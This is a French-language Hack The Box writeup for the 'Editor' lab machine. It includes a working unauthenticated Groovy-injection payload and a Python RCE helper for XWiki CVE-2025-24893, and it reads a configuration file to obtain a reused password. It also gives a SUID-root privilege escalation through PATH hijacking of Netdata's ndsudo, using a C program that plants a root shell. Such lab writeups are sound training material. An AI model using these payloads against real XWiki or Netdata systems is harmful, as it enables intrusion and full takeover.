# Hack The Box: Editor Writeup

<p align="center">
  <img src="https://img.shields.io/badge/HTB-Editor-red?style=for-the-badge&logo=hackthebox&logoColor=white">
  <img src="https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge">
  <img src="https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge&logo=linux&logoColor=white">
  <img src="https://img.shields.io/badge/Attack-CVE--2025--24893-orange?style=for-the-badge">
  <img src="https://img.shields.io/badge/Privilege%20Escalation-PATH%20Hijacking-important?style=for-the-badge">
</p>

https://app.hackthebox.com/machines/Editor

---

# 📚 Table des matières

* [Vue d'ensemble](#-vue-densemble)
* [Reconnaissance](#-reconnaissance)

  * [Scan de ports](#scan-de-ports)
  * [Enumération web: port 80](#enumération-web--port-80)
  * [Enumération web: port 8080 (XWiki)](#enumération-web--port-8080-xwiki)
* [Accès initial](#-accès-initial)

  * [Analyse du binaire SimplistCode](#analyse-du-binaire-simplistcode)
  * [Recherche de CVE: XWiki 15.10.8](#recherche-de-cve--xwiki-15108)
  * [Exploitation: CVE-2025-24893](#exploitation--cve-2025-24893)
  * [Flag utilisateur](#flag-utilisateur)
* [Élévation de privilèges](#-élévation-de-privilèges)

  * [Extraction de credentials: hibernate.cfg.xml](#extraction-de-credentials--hibernatecfgxml)
  * [Pivot vers oliver via SSH](#pivot-vers-oliver-via-ssh)
  * [PATH Hijacking via ndsudo](#path-hijacking-via-ndsudo)
  * [Flag root](#flag-root)
* [Conclusion](#-conclusion)

---

# 🎯 Vue d'ensemble

| Machine | OS    | Difficulté |
| ------- | ----- | ---------- |
| Editor  | Linux | Easy       |

## Description

Cette machine met en œuvre :

* l'énumération d'applications web et de sous-domaines,
* l'analyse statique d'un binaire PyInstaller,
* l'exploitation d'une vulnérabilité RCE sans authentification dans XWiki,
* la récupération de credentials dans des fichiers de configuration,
* l'élévation de privilèges par PATH hijacking sur un binaire SUID.

L'accès initial repose sur **CVE-2025-24893**, une injection de template Groovy via l'endpoint de recherche Solr de **XWiki 15.10.8**, exploitable sans aucune authentification.

---

# 🔎 Reconnaissance

## Scan de ports

```bash
nmap -sC -sV -oN editor_nmap.txt <IP_CIBLE>
```

### Résultat

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
8080/tcp open  http    Jetty 10.0.20
| http-title: XWiki - Main - Intro
```

### Observations

* Port 22 : SSH, utilisé en phase finale.
* Port 80 : serveur nginx qui redirige vers `http://editor.htb/`. Il faut configurer le fichier `/etc/hosts`.
* Port 8080 : instance **XWiki** exposée directement sur Jetty. C'est la surface d'attaque principale.

---

## Configuration du fichier hosts

Le nom de domaine `editor.htb` est absent de la résolution locale. On l'ajoute :

```bash
echo "<IP_CIBLE> editor.htb wiki.editor.htb" | sudo tee -a /etc/hosts
```

Le sous-domaine `wiki.editor.htb` est découvert ultérieurement dans le code JavaScript de l'application React (port 80).

---

## Enumération web: port 80

### Analyse de la page d'accueil

```bash
curl -s http://editor.htb/
```

### Résultat

```html
<title>Editor - SimplistCode Pro</title>
<script type="module" crossorigin src="/assets/index-VRKEJlit.js"></script>
```

L'application est une SPA (Single Page Application) construite avec React et Vite. Elle s'appelle **SimplistCode Pro**: un éditeur de code.

---

### Découverte du sous-domaine et du binaire

En inspectant le fichier JavaScript principal :

```bash
curl -s http://editor.htb/assets/index-VRKEJlit.js | grep -oE 'http://[a-zA-Z0-9._/-]+'
```

### Résultat

```text
http://wiki.editor.htb/xwiki/
```

Le JS mentionne également un fichier `.deb` à télécharger :

```text
/assets/simplistcode_1.0.deb
```

---

## Enumération web: port 8080 (XWiki)

### Identification de la version

Les chemins des ressources JavaScript embarquées révèlent la version exacte :

```text
xwiki-platform-job-webjar/15.10.8/
xwiki-platform-tree-webjar/15.10.8/
```

**Version confirmée : XWiki 15.10.8**

---

### Enumération des espaces et utilisateurs via l'API REST

XWiki expose une API REST accessible sans authentification :

```bash
curl -s "http://wiki.editor.htb/xwiki/rest/wikis/xwiki/spaces" -H "Accept: application/json"
```

### Résultat

```text
Main
Installation
XWiki
```

---

```bash
curl -s "http://wiki.editor.htb/xwiki/rest/wikis/xwiki/spaces/XWiki/pages" -H "Accept: application/json"
```

### Résultat

```json
{
  "fullName": "XWiki.neal",
  "title": "neal"
}
```

### Observations

* Un utilisateur nommé **neal** (Neal Bagwell) est présent sur l'instance XWiki.
* L'API REST est publique et permet l'énumération des utilisateurs sans authentification.
* La tentative de réinitialisation de mot de passe pour `neal` échoue (pas de serveur mail configuré), mais confirme que le compte existe.

---

# 🚀 Accès initial

## Analyse du binaire SimplistCode

### Téléchargement

```bash
curl -LO http://editor.htb/assets/simplistcode_1.0.deb
```

### Extraction du contenu

```bash
mkdir deb_extract && cd deb_extract
ar x ../simplistcode_1.0.deb
tar xf data.tar.xz
```

Le binaire extrait est :

```text
usr/local/bin/simplistcode
```

### Identification

```bash
file usr/local/bin/simplistcode
```

### Résultat

```text
ELF 64-bit LSB executable, dynamically linked ...
```

```bash
strings usr/local/bin/simplistcode | grep -i pyinstaller
```

### Résultat

```text
Could not load PyInstaller's embedded PKG archive from the executable
```

Il s'agit d'un binaire **Python 3.13 compilé avec PyInstaller**. On peut en extraire le bytecode Python.

---

### Extraction du code Python

```bash
python3 pyinstxtractor.py usr/local/bin/simplistcode
```

### Résultat

```text
[+] Possible entry point: teditor.pyc
[+] Successfully extracted pyinstaller archive
```

### Désassemblage du bytecode

```bash
pycdas simplistcode_extracted/teditor.pyc | grep -A5 "run_command"
```

### Résultat (extrait)

```text
Object Name: run_command
[Names]
    'subprocess'
    'Popen'
    'PIPE'
[Constants]
    True   # shell=True
```

### Observations

* Le binaire est un éditeur de texte **Tkinter** local, sans backend web ni API réseau.
* La fonction `run_command` utilise `subprocess.Popen(shell=True)` : c'est un terminal local intégré à l'éditeur.
* Il n'y a pas d'endpoint serveur à exploiter dans cette application.
* Le vrai vecteur d'attaque est **XWiki** sur le port 8080.

---

## Recherche de CVE: XWiki 15.10.8

```bash
searchsploit xwiki
```

### Résultat

```text
XWiki Platform 15.10.10 - Remote Code Execution | multiple/webapps/52136.txt
XWiki Platform 15.10.10 - Metasploit Module     | multiple/webapps/52429.txt
```

```bash
searchsploit -p 52136
```

### Résultat

```text
CVE: CVE-2025-24893
Path: /opt/tools/exploitdb/exploits/multiple/webapps/52136.txt
```

### Description de la CVE

**CVE-2025-24893**: Score CVSS : **9.8 (Critique)**

> XWiki Platform souffre d'une vulnérabilité critique : tout utilisateur invité peut exécuter du code arbitraire à distance via l'endpoint de recherche Solr. Le paramètre `text` de `/xwiki/bin/get/Main/SolrSearch?media=rss` est interprété par le moteur de templates Velocity/Groovy sans assainissement préalable. En injectant un bloc `{{groovy}}`, l'attaquant obtient une exécution de code Java arbitraire avec les privilèges du processus XWiki.

Versions affectées : XWiki **≤ 15.10.10**
Versions corrigées : 15.10.11, 16.4.1, 16.5.0RC1

Notre cible (15.10.8) **est vulnérable**.

---

## Exploitation: CVE-2025-24893

### Vérification du RCE

Le payload Groovy est injecté dans le paramètre `text`, URL-encodé :

```bash
curl -s "http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22id%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d"
```

Le payload décodé est :

```text
}}}{{async async=false}}{{groovy}}println("id".execute().text){{/groovy}}{{/async}}
```

### Résultat (extrait du flux RSS retourné)

```xml
<title>RSS feed for search on [}}}uid=997(xwiki) gid=997(xwiki) groups=997(xwiki)]</title>
```

**RCE confirmé.** On s'exécute en tant qu'utilisateur `xwiki` (UID 997).

---

### Script d'exploitation Python

Pour faciliter l'exécution de commandes, on crée un helper :

```python
import requests, urllib.parse, re

def rce(groovy_code):
    payload = f'}}}}}}{{{{async async=false}}}}{{{{groovy}}}}{groovy_code}{{{{/groovy}}}}{{{{/async}}}}'
    encoded = urllib.parse.quote(payload)
    url = f"http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&text={encoded}"
    r = requests.get(url, timeout=15)
    match = re.search(r'RSS feed for search on \[}}}(.*?)\]', r.text, re.DOTALL)
    return match.group(1).strip() if match else "NO OUTPUT"

# Exemples
print(rce("println('id'.execute().text)"))
print(rce("println(['ls', '/home'].execute().text)"))
```

### Résultat

```text
uid=997(xwiki) gid=997(xwiki) groups=997(xwiki)
oliver
```

---

### Extraction de credentials: hibernate.cfg.xml

Le répertoire `/home/oliver` a les permissions `0750` : l'utilisateur `xwiki` (others) n'y a pas accès. Il faut trouver un moyen de pivoter.

On cherche des fichiers de configuration sensibles accessibles par `xwiki` :

```python
print(rce("println(new File('/etc/xwiki/hibernate.cfg.xml').text)"))
```

### Résultat (extrait pertinent)

```xml
<property name="hibernate.connection.url">
    jdbc:mysql://localhost/xwiki?useSSL=false&amp;connectionTimeZone=LOCAL
</property>
<property name="hibernate.connection.username">xwiki</property>
<property name="hibernate.connection.password">theEd1t0rTeam99</property>
<property name="hibernate.connection.driver_class">com.mysql.cj.jdbc.Driver</property>
```

### Observations

* Le fichier `hibernate.cfg.xml` contient les credentials de la base de données MySQL utilisée par XWiki.
* Le mot de passe trouvé est **`theEd1t0rTeam99`**.
* Ce mot de passe est réutilisé pour le compte système `oliver`.

---

## Pivot vers oliver via SSH

```bash
ssh oliver@<IP_CIBLE>
# Mot de passe : theEd1t0rTeam99
```

### Résultat

```text
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-151-generic x86_64)
oliver@editor:~$
```

Connexion SSH réussie.

---

## Flag utilisateur

```bash
cat /home/oliver/user.txt
```

### Résultat

```text
HTB{user_flag_redacted}
```

---

# 🔺 Élévation de privilèges

## Enumération des groupes et binaires SUID

```bash
id
```

### Résultat

```text
uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)
```

L'utilisateur `oliver` appartient au groupe **`netdata`**.

```bash
find / -perm -4000 -type f 2>/dev/null | grep netdata
```

### Résultat

```text
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
```

---

## PATH Hijacking via ndsudo

### Analyse de ndsudo

```bash
ls -la /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
```

### Résultat

```text
-rwsr-x--- 1 root netdata 200576 Apr  1  2024 /opt/netdata/.../ndsudo
```

Le binaire est **SUID root** et accessible au groupe `netdata` (dont fait partie `oliver`).

```bash
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo --help
```

### Résultat (extrait)

```text
A helper to allow Netdata run privileged commands.

The following commands are supported:

- Command    : nvme-list
  Executables: nvme
  Parameters : list --output-format=json
```

### Observations

* `ndsudo` exécute des commandes prédéfinies en tant que **root**.
* **Point clé** : il recherche les exécutables (`nvme`, etc.) dans le `$PATH` de l'utilisateur courant, sans fixer lui-même un PATH sécurisé.
* Si on place un binaire malicieux nommé `nvme` dans un répertoire qu'on contrôle et qu'on le met en premier dans le `$PATH`, `ndsudo` l'exécutera avec les droits root.

---

### Vérification avec --test

```bash
mkdir /tmp/privesc
export PATH=/tmp/privesc:$PATH
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo --test nvme-list
```

### Résultat

```text
Command to run:
'/tmp/privesc/nvme' 'list' '--output-format=json'
```

`ndsudo` utilise bien notre répertoire `/tmp/privesc` pour trouver `nvme`. Le PATH hijacking est confirmé.

---

### Création du binaire malicieux

> **Pourquoi un binaire C et non un script bash ?**
> Les scripts shell ignorent le bit SUID pour des raisons de sécurité. Un binaire C compilé appelle explicitement `setuid(0)` pour conserver les privilèges root avant d'exécuter des commandes.

Code source du faux `nvme` :

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("cat /root/root.txt > /tmp/rootflag.txt 2>&1");
    system("chmod 644 /tmp/rootflag.txt");
    system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
    return 0;
}
```

On compile **localement** (gcc n'est pas installé sur la cible) et on transfère le binaire :

```bash
# Sur notre machine
gcc -o /tmp/nvme_exploit nvme_exploit.c -static

# Transfert vers la cible
scp /tmp/nvme_exploit oliver@<IP_CIBLE>:/tmp/privesc/nvme
```

---

### Exécution de l'exploit

Sur la cible :

```bash
chmod +x /tmp/privesc/nvme
export PATH=/tmp/privesc:$PATH
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

### Résultat

```bash
ls -la /tmp/rootbash
```

```text
-rwsr-xr-x 1 root root 1396520 Jun 13 09:29 /tmp/rootbash
```

Notre binaire a bien été exécuté en tant que root. `/tmp/rootbash` est une copie de bash avec le bit SUID appartenant à root.

---

## Flag root

```bash
cat /tmp/rootflag.txt
```

### Résultat

```text
HTB{root_flag_redacted}
```

---

# 🧠 Conclusion

Cette machine illustre une chaîne d'attaque complète :

1. Découverte du sous-domaine `wiki.editor.htb` dans le code JavaScript de l'application React.
2. Enumération de l'API REST publique de XWiki pour identifier l'utilisateur `neal`.
3. Identification de la version XWiki 15.10.8 via les chemins de ressources embarquées.
4. Exploitation de **CVE-2025-24893** : injection Groovy sans authentification via l'endpoint Solr de XWiki.
5. Lecture du fichier `hibernate.cfg.xml` via l'RCE pour extraire le mot de passe MySQL `theEd1t0rTeam99`.
6. Réutilisation du mot de passe pour se connecter en SSH en tant qu'`oliver`.
7. Élévation de privilèges par **PATH hijacking** : remplacement du binaire `nvme` cherché par `ndsudo` (SUID root, accessible au groupe `netdata`) par un binaire malicieux.

---

# 🛠️ Outils utilisés

* Nmap
* Curl
* Python 3 (script RCE)
* pyinstxtractor + pycdc (analyse du binaire PyInstaller)
* searchsploit
* GCC (compilation du binaire d'exploitation)
* SSH / SCP

---

# 📌 Points clés à retenir

* Les applications React/Vite peuvent contenir des sous-domaines ou des endpoints sensibles hardcodés dans le JavaScript côté client.
* Une API REST publique (comme celle de XWiki) peut révéler des comptes utilisateurs sans authentification.
* **CVE-2025-24893** affecte toutes les versions de XWiki ≤ 15.10.10 : une seule requête HTTP suffit à obtenir un RCE en tant que root du processus applicatif.
* Les fichiers de configuration d'application (Hibernate, Spring, etc.) contiennent fréquemment des mots de passe en clair, réutilisés pour d'autres comptes.
* Un binaire SUID qui cherche ses dépendances dans le `$PATH` utilisateur est vulnérable au PATH hijacking si ce PATH n'est pas explicitement sécurisé avant l'exec.
* Les scripts bash n'héritent pas du bit SUID : préférer un binaire C compilé pour conserver les privilèges lors d'un PATH hijacking.

---

*Writeup par Jean-Michel Leclercq: résolu le 2026-06-13*
